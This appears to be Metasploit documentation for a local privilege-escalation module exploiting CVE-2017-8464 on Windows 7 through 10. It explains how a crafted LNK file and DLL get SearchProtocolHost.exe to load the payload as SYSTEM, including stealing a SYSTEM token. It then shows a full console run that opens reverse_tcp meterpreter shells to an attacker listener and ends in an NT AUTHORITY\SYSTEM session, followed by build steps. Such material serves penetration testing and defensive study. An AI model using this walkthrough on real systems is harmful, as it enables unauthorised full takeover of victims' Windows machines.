## Description
This module is a Windows local exploit version of the existing file
format module for CVE-2017-8464. The module works by dropping the
specially crafted LNK file and DLL to disk, which causes
`SearchProtocolHost.exe` to parse the LNK file and thus load the DLL via
the vulnerability. Due to `SearchProtocolHost.exe` running as SYSTEM,
this can be used to elevate privileges.

The original DLL template needed some significant reworking to make it
compatible for execution within `SearchProtocolHost.exe`. The payload
was originally failing in the hollowed child `rundll32.exe` process with
a denied error from winsock. This was addressed by checking if the process
which loaded the crafted DLL is `SearchProtocolHost.exe` and when it is,
it opens the token of another SYSTEM process and passes it to
`CreateProcessAsUser` for the payload to work. When the DLL is loaded
into another process or is not running as SYSTEM, this step is skipped
and `NULL` is passed as the token.

Finally a thread is spawned to keep a module reference and monitor the
child process. This is for synchronization to prevent the payload from
being executed in rapid succession from a single exploitation attempt.
The mutex was also updated to the constant of `MUTEX!!!` to leverage
Metasploit's builtin mutex name randomization, which ensures that a name
is unique per module run but not globally unique.

## Vulnerable Systems
Tested and works on
Windows 7x64 SP0
Windows 7x64 SP1
Windows 8x64
Windows 8.1x64
Windows 10x64 Build 1511
Windows 10x64 Build 1607
Windows 10x64 Build 1703

## Running Example:
```
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
> set LHOST 192.168.135.112
LHOST => 192.168.135.112
> set LPORT 30001
LPORT => 30001
> show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.135.112  yes       The listen address
   LPORT     30001            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


[*] > Ruby Code (13 bytes)
> run -z
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.135.112:30001
[*] Sending stage (205379 bytes) to 192.168.134.133
[*] Meterpreter session 1 opened (192.168.135.112:30001 -> 192.168.134.133:49178) at 2017-11-06 10:22:02 -0800
> sysinfo
Computer        : WIN7X64-SP0
OS              : Windows 7 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 4
Meterpreter     : x64/windows
> sessions -l

Active sessions
===============

  Id  Type                     Information                        Connection
  --  ----                     -----------                        ----------
  1   meterpreter x64/windows  WIN7X64-SP0\msfuser @ WIN7X64-SP0  192.168.135.112:30001 -> 192.168.134.133:49178 (192.168.134.133)

> use exploit/windows/local/cve_2017_8464_lnk_lpe
> set session 1
session => 1
> set target 0
target => 0
> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
> set lhost 192.168.135.112
lhost => 192.168.135.112
> set lport 30002
lport => 30002
> set verbose true
verbose => true
> show options

Module options (exploit/windows/local/cve_2017_8464_lnk_lpe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DLLNAME                    no        The DLL file containing the payload
   FILENAME                   no        The LNK file
   PATH                       no        An explicit path to where the files should be written to
   SESSION   1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.135.112  yes       The listen address
   LPORT     30002            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64


> run -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 192.168.135.112:30002
[*] Generating LNK file to load: C:\Users\msfuser\QtGyQHZpWvmzjdsn.dll
[*] Sending stage (205379 bytes) to 192.168.134.133
[*] Meterpreter session 2 opened (192.168.135.112:30002 -> 192.168.134.133:49179) at 2017-11-06 10:23:03 -0800
[*] Waiting 15s before file cleanup...
[+] Deleted C:\Users\msfuser\HADoIQMbEQDpbbRn.lnk
[+] Deleted C:\Users\msfuser\QtGyQHZpWvmzjdsn.dll
> sessions -l

Active sessions
===============

  Id  Type                     Information                        Connection
  --  ----                     -----------                        ----------
  1   meterpreter x64/windows  WIN7X64-SP0\msfuser @ WIN7X64-SP0  192.168.135.112:30001 -> 192.168.134.133:49178 (192.168.134.133)
  2   meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN7X64-SP0  192.168.135.112:30002 -> 192.168.134.133:49179 (192.168.134.133)

> getuid
Server username: WIN7X64-SP0\msfuser
Server username: NT AUTHORITY\SYSTEM
> getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
> getuid
Server username: NT AUTHORITY\SYSTEM
> exit -y
```

## Compiling instructions
`cd ./external/source/exploits/cve-2017-8464`
`./build.sh`

(Requires `mingw-w64` package)
